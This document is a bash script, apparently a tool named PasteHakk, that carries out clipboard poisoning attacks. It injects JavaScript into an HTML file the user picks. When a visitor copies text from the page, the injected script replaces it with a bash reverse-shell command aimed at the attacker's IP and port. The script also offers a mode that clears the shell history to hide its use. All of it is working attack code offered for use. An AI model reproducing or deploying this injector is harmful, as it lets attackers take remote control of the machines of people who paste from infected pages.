#!/bin/bash

clear
Red="\e[1;91m"      ##### Colors Used #####
Green="\e[1;92m"
Yellow="\e[1;93m"
White="\e[1;97m"

banner () {        ##### Banner #####
    echo -e "${Yellow}
      _______\      (((      /_______       __________                   __
   _____\____ \     | ,\    / ____/_____    \______   \_____     _______/  |_   ____
 ____\______ \_\    | __\  /_/ ______/____   |     ___/\__  \   /  ___/\   __\_/ __ \
___\_______ \_\ \___| |___//__/ _______/___  |    |     / __ \_ \___ \  |  |  \  ___/
  \_______ \__ \ \_ v v _/ / __/ _______/    |____|    (____  //____  > |__|   \___  >
     \____\___\_\_\_ v _/_/_/___/____/        ___ ___       \/  __  \/ __          \/
              /  / \_ _/ \  \\               /   |   \______   |  | __|  | __
             |__/  /\_/\  \__|              /    ~    \___  \  |  |/ /|  |/ /
               |__/ /|\ \__|                \    Y    / / __ \_|    < |    <
                 |_/\_/\_|                   \___|_  / (____  /|__|_ \|__|_ \\
                /  ${Red}Linux$Yellow  \\                    \/       \/      \/     \/
               /     +     \\
              /   ${Red}Windows${Yellow}   \\        ${White}A tool to perform clipboard poisoning attack
              ${Yellow}---------------                    ${White}Developed by: ${Red}Sandesh (3xploitGuy)\n\n\n"
}

scan () {
    echo -e "\e[1;97m[\e[1;92m*\e[1;97m]\e[1;92m Enter command to inject : \e[1;97m"
    read inject     ##### Scan command to inject #####

    echo -e "\e[1;97m[\e[1;92m*\e[1;97m]\e[1;92m Enable anonymous mode (y/n) : \e[1;97m"
    read silent

    if [ "$silent" = "Y" ] || [ "$silent" = "y" ]; then     ##### Anon mode clear terminal & history #####
        mode='clear; history -c'
    else
        mode=' '
    fi

    echo -e "\e[1;97m[\e[1;92m*\e[1;97m]\e[1;92m Enter your IP address (LHOST): \e[1;97m"
    read lhost

    echo -e "\e[1;97m[\e[1;92m*\e[1;97m]\e[1;92m Enter port for reverse shell (LPORT): \e[1;97m"
    read lport

    echo -e "\e[1;97m[\e[1;92m*\e[1;97m]\e[1;92m HTML file to infect (path) : \e[1;97m"   ##### Scan path to HTML file #####
    read html_file

    if test -f "$html_file"; then      ##### Checks if file is present or not #####
        pastehakk_generate
    else
        echo -e "$White[${Red}!$White]$Red File doesn't exist..."
        html
    fi
}

pastehakk_generate () {
    if [ ! -d "output" ]; then     ##### Create output directory if not present #####
        mkdir output
    fi

    if grep -q '<body>' "$html_file"; then     ##### Check if file contains body tag #####
        echo -e "$White[${Green}*$White]$Green Infecting html file..."

        # Create a reverse shell using netcat
        echo "<script>document.addEventListener('copy', function(e){console.log(e);e.clipboardData.setData('text/plain', 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1');e.preventDefault();});</script>" >> "$html_file"

        # Copy the infected file to the output directory
        cp "$html_file" "output/generated.html"

        sleep 0.5
        echo -e "$White[${Yellow}*$White]$Yellow Success! "
        sleep 0.5
        echo -e "$White[${Green}*$White]$Green Output saved at : ${White}output/generated.html"
    else
        echo -e "$White[${Red}!$White]$Red Something wrong with this file..."
    fi

    sleep 0.5
    echo -e "$White[${Red}!$White]$Red Exiting...\n"
    exit
}

banner
scan
